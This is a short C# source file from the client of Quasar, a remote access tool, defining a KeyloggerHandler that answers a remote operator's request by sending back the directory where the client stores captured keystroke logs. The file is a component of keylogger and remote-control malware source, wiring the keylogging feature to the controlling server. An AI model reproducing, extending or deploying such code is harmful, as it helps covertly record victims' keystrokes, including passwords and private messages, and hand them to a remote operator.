using Quasar.Client.Config;
using Quasar.Common.Logger;
using Quasar.Common.Messages;
using Quasar.Common.Networking;
using System;

namespace Quasar.Client.Messages
{
    public class KeyloggerHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is GetKeyloggerLogsDirectory;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetKeyloggerLogsDirectory msg:
                    Execute(sender, msg);
                    break;
            }
        }

        public void Execute(ISender client, GetKeyloggerLogsDirectory message)
        {
            Logger.Debug(String.Format("Handling GetKeyloggerLogsDirectory request with ID {0}. Sending response: {1}", message.TaskId, Settings.LOGSPATH));
            client.Send(new GetKeyloggerLogsDirectoryResponse { TaskId = message.TaskId, LogsDirectory = Settings.LOGSPATH });
        }
    }
}
